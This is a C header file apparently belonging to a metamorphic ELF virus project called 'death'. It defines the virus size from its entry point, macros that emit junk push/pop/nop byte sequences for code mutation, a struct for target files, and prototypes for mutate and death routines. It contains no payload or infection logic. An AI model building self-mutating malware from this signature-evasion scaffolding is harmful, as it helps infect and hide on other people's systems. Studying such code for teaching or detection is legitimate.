#ifndef DEATH_H
#define DEATH_H

//#include <stdint.h>
#include "data.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);

#define PAGE_SIZE 4096
#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
#define NB_JUNK_MAX 1000

//#define PUSH "push %rax\n"
//#define POP "pop %rax\n"
//#define NOP "nop\n"
#define B_PUSH_RAX ".byte 0x50\n\t" // push rax
#define B_PUSH_RBX ".byte 0x53\n\t" // push rbx
#define B_POP_RAX ".byte 0x58\n\t" // pop rax
#define B_POP_RBX ".byte 0x5b\n\t" // pop rbx
#define B_NOP ".byte 0x48,0x87,0xc0\n\t" // REX.W xchg rax,rax

#define PUSH_OP 0x50
#define PUSH_RBX 0x53
#define POP_OP 0x58
#define POP_RBX 0x5b
#define NOP_OP 0x90
#define OP_64 0x48
#define ADD 0x83
#define XCHG 0x87
#define RAX_RAX 0xC0


#define JUNK_LEN 10

#define JUNK __asm__ (B_PUSH_RAX B_PUSH_RBX B_NOP B_NOP B_POP_RBX B_POP_RAX)

typedef struct file_s {
	t_fileview *view;
	mode_t mode;
	char abs_path[PATH_MAX];
} file_t;

typedef struct junk_s {
	int junk_offsets[1000];
} junk_t;

void prepare_mutate(void);

void mutate();

int death(file_t *file);

#endif
